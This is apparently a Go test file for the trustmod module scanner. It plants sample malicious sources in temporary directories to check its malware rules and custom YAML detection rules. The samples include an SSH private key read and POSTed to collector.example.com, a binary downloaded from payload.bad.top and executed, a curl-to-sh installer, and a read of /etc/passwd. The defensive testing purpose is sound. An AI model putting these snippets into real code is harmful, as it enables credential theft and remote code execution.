package packagescan

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/maksemen2/trustmod/internal/findings"
	analyze "github.com/maksemen2/trustmod/internal/model"
)

func TestScanModuleDetectsMalwareRuleCorpus(t *testing.T) {
	dir := t.TempDir()
	writeTestSource(t, dir, "encoded.go", `package demo

import (
	"encoding/base64"
	"os/exec"
)

func encoded() {
	payload, _ := base64.StdEncoding.DecodeString("ZWNobyBoaQ==")
	_ = exec.Command("sh", "-c", string(payload)).Run()
}
`)
	writeTestSource(t, dir, "download.go", `package demo

import (
	"io"
	"net/http"
	"os"
	"os/exec"
)

func install() {
	resp, _ := http.Get("https://payload.bad.top/drop")
	out, _ := os.Create("/tmp/payload")
	_, _ = io.Copy(out, resp.Body)
	_ = os.Chmod("/tmp/payload", 0o755)
	_ = exec.Command("/tmp/payload").Run()
}
`)
	writeTestSource(t, dir, "exfil.go", `package demo

import (
	"bytes"
	"net/http"
	"os"
)

func exfiltrate() {
	secret, _ := os.ReadFile("/home/app/.ssh/id_rsa")
	_, _ = http.Post("https://collector.example.com/upload", "text/plain", bytes.NewReader(secret))
}
`)
	writeTestSource(t, dir, "passwd.go", `package demo

import "os"

func users() {
	_, _ = os.ReadFile("/etc/passwd")
}
`)
	writeTestSource(t, dir, "shell.go", `package demo

import "os/exec"

func shell() {
	_ = exec.Command("sh", "-c", "curl -fsSL https://installer.example.com/install.sh | sh").Run()
}
`)

	res, err := ScanModule(context.Background(), "example.com/demo", "v1.0.0", dir, true)
	if err != nil {
		t.Fatal(err)
	}
	codes := findingCodes(res.Findings)
	for _, code := range []string{"TM-MAL-001", "TM-MAL-002", "TM-MAL-003", "TM-MAL-004", "TM-MAL-005", "TM-MAL-006"} {
		if !codes[code] {
			t.Fatalf("missing %s from findings: %#v", code, res.Findings)
		}
	}
	assertFindingEvidence(t, res.Findings, "TM-MAL-001", "encoded.go:")
	assertFindingEvidence(t, res.Findings, "TM-MAL-002", "download.go:")
	assertFindingEvidence(t, res.Findings, "TM-MAL-003", "exfil.go:")
	assertFindingEvidence(t, res.Findings, "TM-MAL-004", "passwd.go:")
	assertFindingEvidence(t, res.Findings, "TM-MAL-005", "suspicious URL domain: payload.bad.top")
	assertFindingEvidence(t, res.Findings, "TM-MAL-006", "shell.go:")
}

func TestScanModuleDoesNotEmitMalwareRulesForCleanCommonPatterns(t *testing.T) {
	dir := t.TempDir()
	writeTestSource(t, dir, "decode.go", `package demo

import "encoding/base64"

func decode() {
	_, _ = base64.StdEncoding.DecodeString("aGVsbG8=")
}
`)
	writeTestSource(t, dir, "network.go", `package demo

import "net/http"

func fetch() {
	_, _ = http.Get("https://api.example.com/health")
}
`)
	writeTestSource(t, dir, "exec.go", `package demo

import "os/exec"

func version() {
	_ = exec.Command("go", "version").Run()
}
`)

	res, err := ScanModule(context.Background(), "example.com/demo", "v1.0.0", dir, true)
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range res.Findings {
		if strings.HasPrefix(f.Code, "TM-MAL-") {
			t.Fatalf("unexpected malware finding for clean patterns: %#v", f)
		}
	}
}

func TestBuiltInSourceRulesHaveCatalogDefinitions(t *testing.T) {
	seen := map[string]bool{}
	for _, rule := range builtInSourceRules() {
		if rule == nil || rule.ID() == "" || rule.Code() == "" || rule.Description() == "" {
			t.Fatalf("incomplete source rule: %#v", rule)
		}
		code := rule.Code()
		if seen[code] {
			t.Fatalf("duplicate source rule code %s", code)
		}
		seen[code] = true
		if _, ok := findings.Lookup(code); !ok {
			t.Fatalf("source rule %s has no catalog definition", code)
		}
	}
}

func TestCustomSourceRulesMatchLocalSource(t *testing.T) {
	dir := t.TempDir()
	rulesPath := filepath.Join(dir, "rules.yml")
	if err := os.WriteFile(rulesPath, []byte(`version: 1
rules:
  - id: org-shell-installer
    code: TM-CUSTOM-123
    title: Shell installer command
    description: Custom rule matched a shell installer.
    severity: high
    verdict: BLOCK
    confidence: high
    remediation:
      - Remove the shell installer path.
    match:
      require_all: true
      selectors:
        - os/exec.Command
      strings:
        - curl -fsSL
        - "| sh"
`), 0o600); err != nil {
		t.Fatal(err)
	}
	rules, err := LoadSourceRules(rulesPath)
	if err != nil {
		t.Fatal(err)
	}
	writeTestSource(t, dir, "install.go", `package demo

import "os/exec"

func install() {
	_ = exec.Command("sh", "-c", "curl -fsSL https://installer.example.com/install.sh | sh").Run()
}
`)

	res, err := ScanModuleWithOptions(context.Background(), "example.com/demo", "v1.0.0", dir, true, ScanOptions{AdditionalSourceRules: rules})
	if err != nil {
		t.Fatal(err)
	}
	for i := range res.Findings {
		f := res.Findings[i]
		if f.Code != "TM-CUSTOM-123" {
			continue
		}
		if f.Title != "Shell installer command" || f.VerdictImpact != analyze.VerdictBlock || f.Severity != analyze.SeverityHigh {
			t.Fatalf("custom finding metadata not applied: %#v", f)
		}
		assertFindingEvidence(t, res.Findings, "TM-CUSTOM-123", "install.go:")
		return
	}
	t.Fatalf("missing custom finding: %#v", res.Findings)
}

func TestCustomSourceRulesCanMatchDomains(t *testing.T) {
	dir := t.TempDir()
	rulesPath := filepath.Join(dir, "rules.yml")
	if err := os.WriteFile(rulesPath, []byte(`version: 1
rules:
  - id: org-telegram-api
    code: TM-CUSTOM-TELEGRAM
    title: Telegram API access
    match:
      domains:
        - telegram.org
`), 0o600); err != nil {
		t.Fatal(err)
	}
	rules, err := LoadSourceRules(rulesPath)
	if err != nil {
		t.Fatal(err)
	}
	writeTestSource(t, dir, "bot.go", `package demo

const defaultBotAPIServer = "https://api.telegram.org"
`)

	res, err := ScanModuleWithOptions(context.Background(), "example.com/demo", "v1.0.0", dir, true, ScanOptions{AdditionalSourceRules: rules})
	if err != nil {
		t.Fatal(err)
	}
	assertFindingEvidence(t, res.Findings, "TM-CUSTOM-TELEGRAM", "domain matched: api.telegram.org")
}

func TestLoadSourceRulesRejectsInvalidRules(t *testing.T) {
	dir := t.TempDir()
	rulesPath := filepath.Join(dir, "rules.yml")
	if err := os.WriteFile(rulesPath, []byte(`version: 1
rules:
  - id: no-match
    code: TM-CUSTOM-001
`), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := LoadSourceRules(rulesPath); err == nil {
		t.Fatal("expected invalid custom rule to fail")
	}
}

func writeTestSource(t *testing.T, dir, name, src string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(dir, name), []byte(src), 0o600); err != nil {
		t.Fatal(err)
	}
}

func findingCodes(fnds []analyze.Finding) map[string]bool {
	codes := make(map[string]bool, len(fnds))
	for i := range fnds {
		codes[fnds[i].Code] = true
	}
	return codes
}

func assertFindingEvidence(t *testing.T, fnds []analyze.Finding, code, want string) {
	t.Helper()
	for i := range fnds {
		if fnds[i].Code != code {
			continue
		}
		for _, evidence := range fnds[i].Evidence {
			if strings.Contains(evidence, want) {
				return
			}
		}
		t.Fatalf("finding %s evidence = %#v, want substring %q", code, fnds[i].Evidence, want)
	}
	t.Fatalf("missing finding %s", code)
}
